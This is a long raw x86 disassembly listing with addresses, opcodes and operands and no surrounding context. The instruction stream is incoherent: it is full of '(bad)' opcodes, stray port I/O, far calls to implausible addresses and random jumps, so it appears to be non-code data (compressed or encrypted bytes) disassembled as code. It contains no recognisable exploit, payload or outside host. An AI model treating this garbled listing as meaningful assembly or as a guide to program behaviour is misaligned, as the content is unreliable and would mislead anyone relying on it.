  425f03:	rcl    DWORD PTR [ecx+0x428131fe],0x43
  425f0a:	addr16 lahf 
  425f0c:	xchg   BYTE PTR [edi],al
  425f0e:	add    eax,0x96ad02f3
  425f13:	test   al,0xd8
  425f15:	aaa    
  425f16:	ret    
  425f17:	fcom   DWORD PTR ds:0xed38d0df
  425f1d:	ss and al,al
  425f20:	and    al,0x3b
  425f22:	lahf   
  425f23:	call   0xee0bc0c3
  425f28:	jae    0x425f6a
  425f2a:	neg    dh
  425f2c:	jo     0x425f55
  425f2e:	push   0x39
  425f30:	nop
  425f31:	push   ecx
  425f32:	outs   dx,BYTE PTR ds:[esi]
  425f33:	ret    0x447e
  425f36:	outs   dx,DWORD PTR ds:[esi]
  425f37:	in     al,0x44
  425f39:	lock cmp DWORD PTR [edx-0x61],edi
  425f3d:	jno    0x425f4c
  425f3f:	cmp    BYTE PTR [edi],0xcf
  425f42:	add    DWORD PTR [edx-0x15c6b5e1],ebx
  425f48:	das    
  425f49:	test   BYTE PTR [ebx],bh
  425f4b:	pop    ebp
  425f4c:	xchg   ecx,eax
  425f4d:	pop    es
  425f4e:	lea    edx,[esi-0x27]
  425f51:	cdq    
  425f52:	call   0xb9d503eb
  425f57:	mov    ebp,0x8a3b9a7c
  425f5c:	pusha  
  425f5d:	cmp    edx,DWORD PTR [ebx+esi*2]
  425f60:	pop    ss
  425f61:	xchg   DWORD PTR [esi],edx
  425f63:	mov    edx,0xe90db629
  425f68:	dec    esi
  425f69:	out    0xef,al
  425f6b:	ins    DWORD PTR es:[edi],dx
  425f6c:	ja     0x425f6d
  425f6e:	ret    0x49b8
  425f71:	stos   BYTE PTR es:[edi],al
  425f72:	xlat   BYTE PTR ds:[ebx]
  425f73:	add    eax,0x51475621
  425f78:	fwait
  425f79:	inc    esp
  425f7a:	outs   dx,BYTE PTR ds:[esi]
  425f7b:	hlt    
  425f7c:	ins    DWORD PTR es:[edi],dx
  425f7d:	(bad)  
  425f7e:	mov    al,ds:0x1b199ac8
  425f83:	xchg   ebx,eax
  425f84:	mov    ds:0x433f5816,al
  425f89:	inc    edi
  425f8a:	enter  0x6128,0x8a
  425f8e:	addr16 (bad) 
  425f90:	dec    edx
  425f91:	mov    ds:0xa6ba3ec2,al
  425f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f97:	mov    ebx,cs
  425f99:	pop    es
  425f9a:	les    ecx,FWORD PTR [esp+eax*1]
  425f9d:	or     DWORD PTR [edx],ecx
  425f9f:	cmp    ebp,DWORD PTR [eax-0x36]
  425fa2:	ret    0xd1f9
  425fa5:	adc    al,al
  425fa7:	dec    esp
  425fa8:	(bad)  
  425fa9:	jne    0x425fa6
  425fab:	mov    ?,WORD PTR [ebx+esi*1+0x4a5495df]
  425fb2:	call   0xd7e4e7fd
  425fb7:	push   ds
  425fb8:	lock ds dec esi
  425fbb:	jecxz  0x425fcf
  425fbd:	cmp    dl,BYTE PTR [edx]
  425fbf:	in     al,dx
  425fc0:	jp     0x425fe3
  425fc2:	ins    DWORD PTR es:[edi],dx
  425fc3:	stos   BYTE PTR es:[edi],al
  425fc4:	data16 (bad) 
  425fc7:	sub    BYTE PTR [esi],ah
  425fc9:	je     0x425fc4
  425fcb:	cmp    al,0x66
  425fcd:	inc    edi
  425fce:	jae    0x425f64
  425fd0:	fist   WORD PTR [edi]
  425fd2:	das    
  425fd3:	adc    eax,0xcd054486
  425fd8:	mov    al,ds:0x83a9d02
  425fdd:	xchg   ch,al
  425fdf:	mov    edi,DWORD PTR [ecx+eiz*1+0x66]
  425fe3:	jge    0x425fff
  425fe5:	add    DWORD PTR [ebx],esp
  425fe7:	mov    bl,0x5
  425fe9:	or     edi,DWORD PTR cs:[ecx-0x32]
  425fed:	xor    eax,0xc066d54c
  425ff2:	adc    edx,ecx
  425ff4:	imul   ebx,DWORD PTR [ecx+0x72],0x2f
  425ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ff9:	fdiv   st,st(1)
  425ffb:	inc    edx
  425ffc:	arpl   WORD PTR [edi],cx
  425ffe:	call   0x7dbe:0x156de8ad
  426005:	out    0x29,al
  426007:	xchg   ecx,eax
  426008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426009:	xchg   esp,eax
  42600a:	int    0xc2
  42600c:	lock jge 0x426024
  42600f:	and    ebp,edi
  426011:	adc    eax,0xa68c3f07
  426016:	sub    eax,0xe4995534
  42601b:	lock push ebp
  42601d:	push   cs
  42601e:	and    al,BYTE PTR [ecx]
  426020:	adc    edx,esi
  426022:	or     DWORD PTR [esi],edx
  426024:	and    ch,ch
  426026:	xor    BYTE PTR [edx+0x56],0xbe
  42602a:	retf   
  42602b:	pop    ebx
  42602c:	push   es
  42602d:	cmp    ah,BYTE PTR [ebx+0x3]
  426030:	pop    edx
  426031:	aaa    
  426032:	mov    ds:0x8018edf3,al
  426037:	jae    0x426076
  426039:	pushf  
  42603a:	loopne 0x425ff2
  42603c:	arpl   WORD PTR [ebp+0x514d1b0f],cx
  426042:	(bad)  
  426043:	jne    0x4260a9
  426045:	into   
  426046:	xchg   ecx,eax
  426047:	xor    cl,dl
  426049:	jo     0x426025
  42604b:	push   ecx
  42604c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42604d:	inc    si
  42604f:	mov    ah,0xb4
  426051:	mov    al,ds:0xaeb9a954
  426056:	xchg   DWORD PTR [eax+0x69],ebx
  426059:	ret    
  42605a:	xor    ah,ah
  42605c:	jg     0x42609d
  42605e:	adc    DWORD PTR [ebp-0x6ff393fa],esp
  426064:	cmp    edx,ebp
  426066:	ret    
  426067:	scas   ax,WORD PTR es:[edi]
  426069:	push   ebx
  42606a:	and    cl,dh
  42606c:	ins    BYTE PTR es:[edi],dx
  42606d:	dec    ebp
  42606e:	fld    QWORD PTR [esi+0x12]
  426071:	xchg   esi,eax
  426072:	jo     0x4260ca
  426074:	fild   QWORD PTR ds:0x50c225b4
  42607a:	fucomi st,st(0)
  42607c:	pop    ds
  42607d:	jo     0x4260b0
  42607f:	mov    dh,0xe3
  426081:	stos   DWORD PTR es:[edi],eax
  426082:	test   eax,0x678fcb7c
  426087:	fcomp  DWORD PTR [ecx+0x7979d668]
  42608d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42608e:	imul   esp,ebp,0x5e
  426091:	inc    cl
  426093:	loop   0x4260ef
  426095:	add    dh,BYTE PTR [ebp-0x2d]
  426098:	shr    BYTE PTR [eax-0x64],1
  42609b:	jmp    0x426102
  42609d:	add    DWORD PTR [edx+0x61],esi
  4260a0:	in     al,dx
  4260a1:	mov    ah,bl
  4260a3:	or     al,0xde
  4260a5:	xor    al,0x5
  4260a7:	test   DWORD PTR [edi-0x7],edx
  4260aa:	cmp    al,BYTE PTR [eax-0x6a3bcfb2]
  4260b0:	dec    eax
  4260b1:	pop    es
  4260b2:	rol    BYTE PTR [ecx+0x2c],1
  4260b5:	lods   al,BYTE PTR ds:[esi]
  4260b6:	(bad)  
  4260b8:	(bad)  
  4260b9:	mov    dh,0x4b
  4260bb:	sub    BYTE PTR [eax-0x57],dl
  4260be:	mov    eax,ds:0xa68c549a
  4260c3:	test   bh,ah
  4260c5:	add    eax,0xcac04223
  4260ca:	push   esi
  4260cb:	js     0x426054
  4260cd:	pusha  
  4260ce:	retf   
  4260cf:	ficom  WORD PTR [edi-0x34c998a]
  4260d5:	hlt    
  4260d6:	retf   0xb859
  4260d9:	shl    DWORD PTR [ebp-0xc],1
  4260dc:	nop
  4260dd:	in     eax,0x41
  4260df:	dec    ebx
  4260e0:	ss xchg ebx,eax
  4260e2:	int    0x53
  4260e4:	dec    ecx
  4260e5:	cld    
  4260e6:	rol    DWORD PTR [ebx*2-0x3ee097b1],1
  4260ed:	or     al,0x12
  4260ef:	(bad)  
  4260f0:	outs   dx,BYTE PTR ds:[esi]
  4260f1:	mov    bh,0x7c
  4260f3:	repnz dec esi
  4260f5:	jp     0x42613e
  4260f7:	(bad)  
  4260f8:	and    al,0xa4
  4260fa:	test   eax,0xe29ab45e
  4260ff:	cld    
  426100:	in     eax,dx
  426101:	mov    ebp,0xd51f6d02
  426106:	jo     0x4260dc
  426108:	adc    bl,bl
  42610a:	sbb    DWORD PTR [ebp+0x3b9d9b35],edi
  426110:	mov    al,0xc6
  426112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426113:	xchg   ebp,eax
  426114:	(bad)  
  426115:	imul   ecx,DWORD PTR [esi],0x48
  426118:	push   eax
  426119:	add    esi,DWORD PTR [esi+eax*4+0x29289dc1]
  426120:	xor    DWORD PTR [ebx+edi*1+0x43],0x0
  426125:	ds or  eax,0xadb6025
  42612b:	push   0x24
  42612d:	aas    
  42612e:	mov    bh,0x6b
  426130:	inc    ecx
  426131:	cdq    
  426132:	mov    ah,0x24
  426134:	pusha  
  426135:	jb     0x42613f
  426137:	into   
  426138:	out    dx,eax
  426139:	repnz aam 0x33
  42613c:	fs mov ebp,0xf2d38385
  426142:	(bad)  
  426143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426144:	mov    ds:0x876c5dab,al
  426149:	stc    
  42614a:	or     ch,BYTE PTR [edi+0x77]
  42614d:	dec    BYTE PTR [esi-0x5b40a3d5]
  426153:	pop    ecx
  426154:	ss int 0x1d
  426157:	mov    ds,WORD PTR [esi]
  426159:	add    ebp,edx
  42615b:	sbb    BYTE PTR [esi],al
  42615d:	cmp    al,BYTE PTR [edi+0x2f0a84a3]
  426163:	test   eax,0x7d17715b
  426168:	mov    cl,0xff
  42616a:	push   ebx
  42616b:	into   
  42616c:	imul   ebx,DWORD PTR [esi-0x44779921],0x21
  426173:	aaa    
  426174:	xor    DWORD PTR [ecx],esp
  426176:	jecxz  0x426118
  426178:	retf   
  426179:	sar    edx,cl
  42617b:	push   0xfdb24e98
  426180:	mov    esi,0x8b408b9e
  426185:	test   eax,0x16834edb
  42618a:	stos   BYTE PTR es:[edi],al
  42618b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42618c:	shld   DWORD PTR [edx+0x24],ebx,0xe2
  426191:	push   edx
  426192:	lock les ebx,FWORD PTR ds:0x4cb5a72b
  426199:	mov    ebx,0x425a8bee
  42619e:	xchg   ebx,eax
  42619f:	xor    dh,bh
  4261a1:	or     al,0xd9
  4261a3:	xlat   BYTE PTR ds:[ebx]
  4261a4:	jo     0x4261d3
  4261a6:	pop    ss
  4261a7:	cmp    DWORD PTR [ebp+eax*4-0x51],0xffffffc9
  4261ac:	les    esi,FWORD PTR [eax-0x7c]
  4261af:	mov    ebp,0x27f2d2d8
  4261b4:	pop    eax
  4261b5:	jecxz  0x42621e
  4261b7:	rcr    esp,1
  4261b9:	jo     0x426220
  4261bb:	jg     0x426140
  4261bd:	xlat   BYTE PTR ds:[ebx]
  4261be:	test   dl,bl
  4261c0:	push   ebp
  4261c1:	xchg   BYTE PTR [edi],ah
  4261c3:	lahf   
  4261c4:	jp     0x42618f
  4261c6:	or     dh,BYTE PTR [ecx+0x31b865a0]
  4261cc:	add    bl,BYTE PTR [eax-0xb]
  4261cf:	sub    al,0x29
  4261d1:	out    0xee,al
  4261d3:	retf   
  4261d4:	aad    0x96
  4261d6:	mov    esp,DWORD PTR [edx+0x3b]
  4261d9:	test   al,0xcf
  4261db:	bswap  esp
  4261dd:	test   ebp,esi
  4261df:	mov    edx,0xc9f0c6f7
  4261e4:	ins    DWORD PTR es:[edi],dx
  4261e5:	shl    DWORD PTR [edx+0x74],cl
  4261e8:	dec    esi
  4261e9:	fnsave [ebx-0x367963fc]
  4261ef:	pop    ebp
  4261f0:	mov    ah,0x10
  4261f2:	cli    
  4261f3:	bound  esi,QWORD PTR [edi+ecx*4+0x51eb3b6a]
  4261fa:	jmp    0x4261fb
  4261fc:	inc    eax
  4261fd:	out    0x3,al
  4261ff:	das    
  426200:	pushf  
  426201:	xor    al,0xd6
  426203:	or     edx,ebx
  426205:	dec    ebx
  426206:	sub    ebx,DWORD PTR [eax-0x5b]
  426209:	outs   dx,DWORD PTR ds:[esi]
  42620a:	loope  0x426238
  42620c:	test   eax,0xa1aca6c0
  426211:	lahf   
  426212:	pop    ss
  426213:	dec    BYTE PTR [ebp-0x3b]
  426216:	inc    esi
  426217:	sub    esi,DWORD PTR [edi-0x63771fac]
  42621d:	test   eax,0xfa57094d
  426222:	and    al,0x72
  426224:	sahf   
  426225:	dec    edx
  426226:	in     eax,0x34
  426228:	cmp    esp,DWORD PTR [ebx-0xa]
  42622b:	adc    ebx,DWORD PTR [edx+0x41]
  42622e:	imul   ebx,DWORD PTR [edx+0x4717c576],0xcb50f34a
  426238:	sbb    ah,BYTE PTR [ecx+0x4ae63d4]
  42623e:	push   eax
  42623f:	dec    ebp
  426240:	push   ebx
  426241:	jp     0x42623e
  426243:	and    ebx,0xfe70434f
  426249:	push   eax
  42624a:	adc    DWORD PTR [ebx+0xef2a752],edi
  426250:	mov    DWORD PTR [ebx],eax
  426252:	cs das 
  426254:	inc    ecx
  426255:	in     al,0x78
  426257:	cmc    
  426258:	lods   al,BYTE PTR ds:[esi]
  426259:	scas   eax,DWORD PTR es:[edi]
  42625a:	imul   edx,DWORD PTR [eax-0x2b],0xc0a2c8ae
  426261:	call   0xa697:0x5bb1db4f
  426268:	icebp  
  426269:	mov    ebx,ecx
  42626b:	push   esi
  42626c:	adc    DWORD PTR [edi-0x25e2b877],eax
  426272:	pushf  
  426273:	push   ecx
  426274:	push   ebx
  426275:	outs   dx,DWORD PTR ds:[esi]
  426276:	and    DWORD PTR [ebx+ecx*8+0x19],esp
  42627a:	sar    BYTE PTR [edx+edx*1-0x6ba54c4e],cl
  426281:	mov    esi,0x98b1bd2a
  426286:	xor    edx,ebx
  426288:	cmp    eax,DWORD PTR [edx]
  42628a:	pushf  
  42628b:	clc    
  42628c:	or     ch,BYTE PTR [edi]
  42628e:	pop    ebp
  42628f:	loop   0x426292
  426291:	pop    eax
  426292:	push   ds
  426293:	das    
  426294:	xor    DWORD PTR [ebx-0x11],0x677ae823
  42629b:	dec    edx
  42629c:	xor    DWORD PTR [edi-0x1a3a25a4],eax
  4262a2:	int    0x11
  4262a4:	add    esi,DWORD PTR [edi]
  4262a6:	jecxz  0x42623f
  4262a8:	pusha  
  4262a9:	ins    DWORD PTR es:[edi],dx
  4262aa:	lds    eax,FWORD PTR [ebx-0x5a]
  4262ad:	addr16 jno 0x42632a
  4262b0:	call   0x62bfea37
  4262b5:	mov    bh,BYTE PTR [eax-0x7a]
  4262b8:	mov    ecx,0x395b85fb
  4262bd:	pop    eax
  4262be:	and    al,0xb2
  4262c0:	mov    eax,ds:0x243f5798
  4262c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262c6:	sub    al,0xe6
  4262c8:	push   esi
  4262c9:	lock jecxz 0x4262ca
  4262cc:	xlat   BYTE PTR ds:[ebx]
  4262cd:	xchg   esi,eax
  4262ce:	mov    dh,0x1
  4262d0:	jmp    FWORD PTR [esp]
  4262d3:	fisubr DWORD PTR [eax-0x5d8808f0]
  4262d9:	sbb    BYTE PTR [edi],0xd2
  4262dc:	and    eax,DWORD PTR [esi-0x497ebb6d]
  4262e2:	pop    esp
  4262e3:	push   ss
  4262e4:	pushf  
  4262e5:	daa    
  4262e6:	sbb    dh,0x91
  4262e9:	and    esp,edi
  4262eb:	(bad)  
  4262ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262ed:	dec    eax
  4262ee:	or     BYTE PTR [eax+0x3ba4849a],bh
  4262f4:	pop    eax
  4262f5:	dec    ebx
  4262f6:	push   ecx
  4262f7:	adc    al,0x34
  4262f9:	mov    dl,0xfc
  4262fb:	or     eax,0xd146e851
  426300:	push   0xa0878694
  426305:	and    DWORD PTR [esi],eax
  426307:	sub    bl,BYTE PTR [esp+edi*2-0x8]
  42630b:	jmp    0xdd49d7e7
  426310:	and    cl,BYTE PTR [eax]
  426312:	loope  0x426354
  426314:	xor    BYTE PTR [ecx-0x16ef9533],ch
  42631a:	retf   0x598b
  42631d:	aas    
  42631e:	cld    
  42631f:	jp     0x4262a5
  426321:	pop    ecx
  426322:	or     ah,bh
  426324:	je     0x426381
  426326:	retf   
  426327:	xchg   BYTE PTR [edi+0x5e93c0af],al
  42632d:	xchg   ecx,eax
  42632e:	mov    ecx,0xa9b69d51
  426333:	mov    esp,0xcef05a7f
  426338:	daa    
  426339:	sahf   
  42633a:	cmp    DWORD PTR [esi+0x4f],esi
  42633d:	in     al,dx
  42633e:	push   ebx
  42633f:	out    0x4e,al
  426341:	mov    es,WORD PTR [esi]
  426343:	jns    0x426388
  426345:	neg    BYTE PTR [ebp+ebx*2-0x7898df5e]
  42634c:	xor    bh,BYTE PTR [edx]
  42634e:	fstp   TBYTE PTR [ebx+0x60d4de21]
  426354:	mov    bl,0xf3
  426356:	and    eax,esi
  426358:	and    eax,0xfcf023a6
  42635d:	or     BYTE PTR [edx+0x70b1e607],al
  426363:	mov    al,0x5b
  426365:	sub    al,BYTE PTR [eax+0x10]
  426368:	cwde   
  426369:	sub    eax,0x53e2f6d0
  42636e:	push   ds
  42636f:	jo     0x426346
  426371:	pop    esi
  426372:	inc    edi
  426373:	push   ss
  426374:	pop    esi
  426375:	mov    ebx,0x57fa8c50
  42637a:	jecxz  0x4263da
  42637c:	inc    esp
  42637d:	inc    esp
  42637e:	mov    esi,0xb0773a1
  426383:	(bad)  
  426384:	xor    eax,0x117143b5
  426389:	test   al,0xe
  42638b:	(bad)  [ecx+eax*1]
  42638e:	adc    al,0xe0
  426390:	push   0xffffffe3
  426392:	xor    esi,DWORD PTR [ebx-0x6aa2a2f5]
  426398:	jnp    0x4263d1
  42639a:	pop    ecx
  42639b:	dec    edi
  42639c:	xlat   BYTE PTR ds:[ebx]
  42639d:	pusha  
  42639e:	fstp   QWORD PTR [esi]
  4263a0:	sub    eax,0x20282294
  4263a5:	mov    dh,0x57
  4263a7:	call   0x2f7b:0xb9c557a6
  4263ae:	nop
  4263af:	sbb    ecx,edx
  4263b1:	or     BYTE PTR [ebp+ebx*8-0x4e79bc89],cl
  4263b8:	sbb    cl,BYTE PTR [ebx]
  4263ba:	xchg   esp,eax
  4263bb:	ret    0x55ff
  4263be:	lods   eax,DWORD PTR ds:[esi]
  4263bf:	pop    esp
  4263c0:	jns    0x4263f4
  4263c2:	lds    esi,FWORD PTR [ebx]
  4263c4:	call   0xd53529d5
  4263c9:	test   eax,0x5c7ff934
  4263ce:	fisttp QWORD PTR [edx]
  4263d0:	jb     0x4263ca
  4263d2:	pop    ss
  4263d3:	fs call 0x2bbe:0xb00c91d5
  4263db:	pop    es
  4263dc:	int3   
  4263dd:	dec    edi
  4263de:	push   ss
  4263df:	adc    al,0x73
  4263e1:	es pop edx
  4263e3:	fwait
  4263e4:	(bad)  
  4263e5:	(bad)  
  4263e6:	into   
  4263e7:	mov    al,0x66
  4263e9:	add    BYTE PTR [ecx+0x27],ah
  4263ec:	xor    DWORD PTR [edx],eax
  4263ee:	inc    ebp
  4263ef:	gs xchg ecx,eax
  4263f1:	fcomp  QWORD PTR [ebp-0x12714dcf]
  4263f7:	mov    ah,0xf8
  4263f9:	test   BYTE PTR [edi+edx*1],ch
  4263fc:	or     DWORD PTR [edx+ecx*4],ecx
  4263ff:	cmp    DWORD PTR [eax+0x6d7999ad],edx
  426405:	in     al,0x35
  426407:	or     esp,esi
  426409:	ins    BYTE PTR es:[edi],dx
  42640a:	idiv   BYTE PTR [edi-0x1a]
  42640d:	mov    DWORD PTR [eax],ebx
  42640f:	xchg   ebp,eax
  426410:	cwde   
  426411:	add    al,0x2a
  426413:	pop    edx
  426414:	mov    edx,0x2b2dab87
  426419:	jbe    0x426493
  42641b:	dec    eax
  42641c:	les    esp,FWORD PTR [edx-0x3ed343f]
  426422:	or     DWORD PTR [eax+eax*2-0x3b],esi
  426426:	bound  edi,QWORD PTR [ecx-0x51]
  426429:	adc    ecx,ebp
  42642b:	push   es
  42642c:	mov    bh,0x47
  42642e:	mov    cs,ebx
  426430:	int    0x9d
  426432:	loop   0x4263be
  426434:	test   al,0xc8
  426436:	mov    cl,0xcd
  426438:	fldcw  WORD PTR [edi-0x16]
  42643b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42643c:	push   es
  42643d:	repz and ah,dh
  426440:	stos   BYTE PTR es:[edi],al
  426441:	jo     0x426497
  426443:	xor    dh,al
  426445:	pop    ds
  426446:	lahf   
  426447:	cmp    al,BYTE PTR [ecx]
  426449:	push   esi
  42644a:	push   edx
  42644b:	or     BYTE PTR [eax-0x73],bh
  42644e:	stos   BYTE PTR es:[edi],al
  42644f:	pushf  
  426450:	sub    bl,BYTE PTR [eax]
  426452:	repz adc BYTE PTR [edx-0x4a1b81d8],al
  426459:	shl    DWORD PTR [edi-0x48],1
  42645c:	repnz push 0xffffffc3
  42645f:	pop    ecx
  426460:	fsubr  DWORD PTR [edi-0x184eeef5]
  426466:	mov    al,ds:0x88505b5a
  42646b:	shr    ch,0xdb
  42646e:	pop    esp
  42646f:	mov    WORD PTR [eax-0x27],gs
  426472:	leave  
  426473:	mov    edi,0x8d4390e1
  426478:	mov    bl,0x1f
  42647a:	or     eax,esp
  42647c:	inc    esi
  42647d:	ds dec esp
  42647f:	inc    BYTE PTR gs:[ebx+0x51940f35]
  426486:	cli    
  426487:	or     BYTE PTR [ebx],ah
  426489:	ins    DWORD PTR es:[edi],dx
  42648a:	mov    esp,0x64437dac
  42648f:	sbb    esi,DWORD PTR [edx]
  426491:	cli    
  426492:	mov    esi,0x98208e16
  426497:	enter  0xab73,0xfb
  42649b:	fsubr  DWORD PTR [eax-0x2e]
  42649e:	sbb    edx,DWORD PTR [eax+0x3e]
  4264a1:	adc    DWORD PTR [edx+0x7],eax
  4264a4:	mov    dh,0xb9
  4264a6:	icebp  
  4264a7:	iret   
  4264a8:	mov    eax,ds:0x31f4ea93
  4264ad:	sbb    eax,0x1d86000f
  4264b2:	ins    BYTE PTR es:[edi],dx
  4264b3:	outs   dx,DWORD PTR ds:[esi]
  4264b4:	jns    0x426520
  4264b6:	sub    eax,0x1dc5a581
  4264bb:	retf   0x2b2f
  4264be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264bf:	rcl    WORD PTR [eax],1
  4264c2:	fsubr  st(0),st
  4264c4:	lea    edi,[esp+ecx*2]
  4264c7:	inc    esi
  4264c8:	xchg   ebx,eax
  4264c9:	cmc    
  4264ca:	pop    ecx
  4264cb:	mov    dh,0x71
  4264cd:	retf   
  4264ce:	or     edx,esp
  4264d0:	jl     0x426471
  4264d2:	inc    esi
  4264d3:	fmul   DWORD PTR [ebp-0x23]
  4264d6:	inc    ebp
  4264d7:	and    BYTE PTR [edx],al
  4264d9:	cmp    al,0x96
  4264db:	stos   BYTE PTR es:[edi],al
  4264dc:	jp     0x42647d
  4264de:	xchg   esp,eax
  4264df:	jnp    0x42655d
  4264e1:	call   0x9696da87
  4264e6:	mov    ch,0xd9
  4264e8:	cmp    esp,ecx
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	pop    ds
  4264f7:	jg     0x42650f
  4264f9:	je     0x4264db
  4264fb:	repnz add DWORD PTR [eax],eax
  4264fe:	mov    BYTE PTR [esi],al
  426500:	add    BYTE PTR [eax],al
  426502:	pusha  
  426503:	enter  0x55a2,0x87
  426507:	gs sti 
  426509:	fistp  QWORD PTR [ebx]
  42650b:	loopne 0x426588
  42650d:	mov    al,ds:0x2face110
  426512:	mov    ?,WORD PTR [ebp+0x26]
  426515:	popf   
  426516:	fwait
  426517:	call   0xf3cf:0x844b31b6
  42651e:	hlt    
  42651f:	pop    es
  426520:	loopne 0x4264cc
  426522:	pop    edi
  426523:	fadd   DWORD PTR [esi-0x5f7554f]
  426529:	(bad)  
  42652a:	or     ebp,DWORD PTR [ebx-0x729dca3]
  426530:	lods   al,BYTE PTR ds:[esi]
  426531:	scas   eax,DWORD PTR es:[di]
  426533:	data16 in al,0xf3
  426536:	lahf   
  426537:	(bad)  
  426538:	mov    ebx,0x19f00853
  42653d:	xlat   BYTE PTR ds:[ebx]
  42653e:	mov    ds:0xa16573ff,al
  426543:	das    
  426544:	dec    edx
  426545:	jno    0x426585
  426547:	cmp    bl,BYTE PTR [eax-0x352f560c]
  42654d:	xchg   edx,eax
  42654e:	cmp    eax,0xe7c7939d
  426553:	inc    ebx
  426554:	push   0x7363bc68
  426559:	cs in  al,dx
  42655b:	cmp    eax,0xb7254bc3
  426560:	sub    dh,cl
  426562:	inc    ebp
  426563:	ds jp  0x42659c
  426566:	dec    esi
  426567:	mov    WORD PTR [ecx+0xa577e97],ds
  42656d:	sbb    DWORD PTR [ecx+0x33],eax
  426570:	pop    es
  426571:	sbb    BYTE PTR [edi],bh
  426573:	pop    es
  426574:	je     0x4265b9
  426576:	fild   QWORD PTR [esi+0x71]
  426579:	push   ecx
  42657a:	mov    al,ds:0xcfc63fcf
  42657f:	sub    edi,ebp
  426581:	pop    esp
  426582:	test   DWORD PTR [edx-0x67],edi
  426585:	call   0x1b2c2679
  42658a:	clc    
  42658b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42658c:	and    ah,BYTE PTR [ebp-0x1c]
  42658f:	xor    ebp,DWORD PTR [edx+esi*4-0xe298de7]
  426596:	je     0x4265c8
  426598:	pop    ecx
  426599:	icebp  
  42659a:	jl     0x426572
  42659c:	test   DWORD PTR [ebp+0x7fa1084b],edi
  4265a2:	and    ch,BYTE PTR [ebp-0x1]
  4265a5:	scas   eax,DWORD PTR es:[edi]
  4265a6:	fsubr  QWORD PTR [ecx]
  4265a8:	fld    DWORD PTR [ebp-0x4d]
  4265ab:	push   eax
  4265ac:	lods   eax,DWORD PTR ds:[esi]
  4265ad:	adc    DWORD PTR [edi+0x0],ebp
  4265b0:	dec    eax
  4265b1:	mov    bl,0x1c
  4265b3:	not    DWORD PTR [edi-0x80]
  4265b6:	dec    edi
  4265b7:	(bad)  
  4265b8:	stc    
  4265b9:	mov    ch,0xa6
  4265bb:	pop    esi
  4265bc:	(bad)  
  4265be:	lock xor al,0x27
  4265c1:	xor    dl,dl
  4265c3:	and    DWORD PTR [ebx-0x1a8029d0],ebx
  4265c9:	fwait
  4265ca:	mov    cl,BYTE PTR cs:[eax+0x25]
  4265ce:	dec    ebx
  4265cf:	pop    ebp
  4265d0:	int3   
  4265d1:	rcr    BYTE PTR [edx-0x56d0a170],1
  4265d7:	enter  0x4661,0x5
  4265db:	sub    BYTE PTR [edx-0x1b],ah
  4265de:	sbb    DWORD PTR [esi+ebx*4+0x3b],esp
  4265e2:	aaa    
  4265e3:	jns    0x4265c3
  4265e5:	ja     0x4265a6
  4265e7:	add    eax,0x11c4edcf
  4265ec:	lods   eax,DWORD PTR ds:[esi]
  4265ed:	inc    ecx
  4265ee:	ror    DWORD PTR [ebx-0x16070efe],1
  4265f4:	inc    esi
  4265f5:	xchg   ecx,eax
  4265f6:	scas   al,BYTE PTR es:[edi]
  4265f7:	dec    esp
  4265f8:	adc    ecx,DWORD PTR [edx+0x33]
  4265fb:	cmp    BYTE PTR [ebx-0x351601b2],0x2b
  426602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426603:	jge    0x426585
  426605:	lds    esi,FWORD PTR [ecx-0x7da3e0a5]
  42660b:	cs cld 
  42660d:	pop    ecx
  42660e:	scas   al,BYTE PTR es:[edi]
  42660f:	ror    BYTE PTR ss:[eax+ebx*8+0x697b3802],0x14
  426618:	rcr    DWORD PTR [edi+ecx*1],cl
  42661b:	mov    dl,0x9
  42661d:	sub    DWORD PTR [ecx+0x239ffb56],ebp
  426623:	das    
  426624:	cmp    al,0xce
  426626:	gs mov ebx,0xfdbd63f6
  42662c:	int3   
  42662d:	mov    ebx,0xc54f7692
  426632:	sub    al,0xea
  426634:	jnp    0x426651
  426636:	bndstx [edx-0x16],bnd0
  42663a:	mov    bl,0x99
  42663c:	test   eax,0x5a391d25
  426641:	fnstenv [esi+0x2d]
  426644:	lea    eax,[ebp-0x30]
  426647:	mov    eax,0x41124141
  42664c:	fs push edx
  42664e:	pop    esp
  42664f:	or     eax,0x2598383e
  426654:	iret   
  426655:	sbb    eax,DWORD PTR [eax+0x30]
  426658:	and    bl,BYTE PTR [eax-0x56]
  42665b:	xor    edi,DWORD PTR [ebx+0x1a9922b8]
  426661:	test   eax,0x114b94ce
  426666:	outs   dx,BYTE PTR ds:[esi]
  426667:	cs jp  0x426640
  42666a:	adc    BYTE PTR [eax],cl
  42666c:	mov    ebp,0x98318fad
  426671:	mov    al,0xd5
  426673:	dec    esi
  426674:	pushf  
  426675:	fstp   DWORD PTR [edx+0x29c8b933]
  42667b:	ret    
  42667c:	jecxz  0x42668b
  42667e:	js     0x4266a6
  426680:	dec    BYTE PTR [ecx]
  426682:	sub    esp,DWORD PTR ds:0xa9a9f10f
  426688:	test   al,0xbc
  42668a:	push   edi
  42668b:	mov    DWORD PTR [ebx],eax
  42668d:	dec    esp
  42668e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42668f:	mov    ds:0x8eb7a104,eax
  426694:	push   es
  426695:	(bad)  
  426696:	sbb    esp,edx
  426698:	adc    cl,ch
  42669a:	sub    ebp,esp
  42669c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42669d:	sahf   
  42669e:	aad    0x1
  4266a0:	jl     0x426701
  4266a2:	std    
  4266a3:	push   ss
